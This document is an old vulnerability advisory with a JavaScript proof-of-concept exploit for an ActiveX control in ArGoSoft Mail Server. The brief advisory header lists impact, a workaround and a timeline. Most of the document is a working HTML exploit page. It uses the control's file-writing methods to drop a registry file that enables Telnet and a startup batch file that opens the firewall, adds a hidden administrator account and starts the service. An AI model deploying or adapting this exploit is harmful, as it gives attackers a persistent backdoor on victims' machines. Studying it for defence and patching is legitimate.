@@ -1,0 +1,143 @@
+<!--
+----------------------------------------------------------------------------
+
+:. GOODFELLAS Security Research TEAM  .:
+:. http://goodfellas.shellcode.com.ar .:
+
+mlsrvx.dll 1.8.9.1 ArGoSoft Mail Server Arbitrary Data Write & Remote Code Execution
+============================================================================ ========
+
+Internal ID: VULWAR2007271.
+-----------
+
+Introduction
+------------
+mlsrvx.dll is a library included in the Program ArGoSoft Mail Server
+software package from ArgoSoft Company.
+
+
+Tested In
+---------
+- Windows XP SP1/SP2 french/english with IE 6.0 / 7.0.
+
+
+Summary
+-------
+The Add & SaveToFile methods doesn't check if they're being called from the application,
+or malicious users. Remote Attacker could craft a html page and write arbitrary
+files.
+
+
+Impact
+------
+An attacker could write arbitrary data and execute arbitrary code into the
+remote machine.
+
+
+Workaround
+----------
+- Activate the Kill bit zero in clsid:3F06B376-8DB8-49D1-8BF8-D4C070EFEBA5
+- Unregister mlsrvx.dll using regsvr32.
+
+
+Timeline
+--------
+July 27 2007 -- Bug Discovery.
+July 27 2007 -- Exploit published.
+
+
+Credits
+-------
+ * callAX <callAX@shellcode.com.ar>
+ * GoodFellas Security Research Team  <goodfellas.shellcode.com.ar>
+ 
+
+Technical Details
+-----------------
+Telnet service will be started in (2) reboot. Any other kind of exploit could be easily
+set up because the attacker can write files and put specific data into these files.
+Attacker could also encrypt easily the HTML file using Javascript Techniques, so the code could
+be harder to understand. You may need some changes to standard english win32 paths in the provided
+Javascript Proof of Concept.
+
+
+Proof of Concept
+---------------->
+
+<HTML>
+<BODY>
+  <object id=ctrl classid="clsid:{3F06B376-8DB8-49D1-8BF8-D4C070EFEBA5}"></object>
+  <object id=ctrl0 classid="clsid:{3F06B376-8DB8-49D1-8BF8-D4C070EFEBA5}"></object>
+<SCRIPT>
+
+function DoDirtyJob()
+    { 
+//----------------------------------------START CREATING REG FILE----------------------------//
+    // Setup Path to reg file. This file will be used to set Up Telnet Service to Manual Mode
+    // so the next (2) reboots the service will be started.
+    RegFile="c:\\windows\\system32\\config.reg"
+    // Lines to be written into reg file.
+    Line50="REGEDIT4"
+    Line51="[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\TlntSvr]"
+    Line52='"Start"=dword:0000003'
+ 
+    Line53="[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TlntSvr]"
+    Line54='"Start"=dword:0000003'
+
+    ctrl.Add (Line50);
+    ctrl.SaveToFile (RegFile);
+    ctrl.Add (Line51);
+    ctrl.SaveToFile (RegFile);
+    ctrl.Add (Line52);
+    ctrl.SaveToFile (RegFile);
+    ctrl.Add (Line53);
+    ctrl.SaveToFile (RegFile);
+    ctrl.Add (Line54);
+    ctrl.SaveToFile (RegFile);
+//---------------------------------------REG FILE IS FINISHED-------------------------------//
+
+//--------------------------------------START CREATING BAT FILE------------------------------//
+
+    // Path and file
+    File="c:\\docume~1\\callax\\menudm~1\\progra~1\\dmarra~1\\msservice.bat"
+
+    // Set Up Lines to write into bat file. Basically allowing telnet server, creating one user, adding this user to admins group,
+    // and changing values into regedit without user confirmation. Telnet will be started automatically the next (2) reboots.
+
+    Line1="@echo off"
+    // Enabling telnet service in the windows firewall.
+    Line2="netsh firewall add allowedprogram %SystemRoot%\\system32\\tlntsvr.exe MicrosoftXMLService ENABLE"
+
+    // If needed this line open one port from Windows Firewall
+    //OpeningPortLine="netsh firewall add portopening tcp 63555 MicrosoftUpdateService"
+    
+
+    Line3="net user guest1 guest1 /add"
+    Line4="net localgroup Administrateurs guest1 /add"
+    // Changing the regedit WITHOUT user confirmation.
+    Line5="regedit /s c:\\windows\\system32\\config.reg"
+    Line6="net start telnet"
+
+    // Writing lines into file Using vulnerable method Add.
+    ctrl0.Add (Line1);
+    // Saving lines into the file using vulnerable method SaveToFile.
+    ctrl0.SaveToFile (File);
+    ctrl0.Add (Line2);
+    ctrl0.SaveToFile (File);
+    ctrl0.Add (Line3);
+    ctrl0.SaveToFile (File);
+    ctrl0.Add (Line4);
+    ctrl0.SaveToFile (File);
+    ctrl0.Add (Line5);
+    ctrl0.SaveToFile (File);
+    ctrl0.Add (Line6);
+    ctrl0.SaveToFile (File);
+}
+//---------------------------------------BAT FILE IS FINISHED-------------------------------//
+</SCRIPT>
+<input language=JavaScript onclick=DoDirtyJob() type=button value="Proof Of
+Concept">
+</BODY>
+</HTML>
+
+# milw0rm.com [2007-07-27]
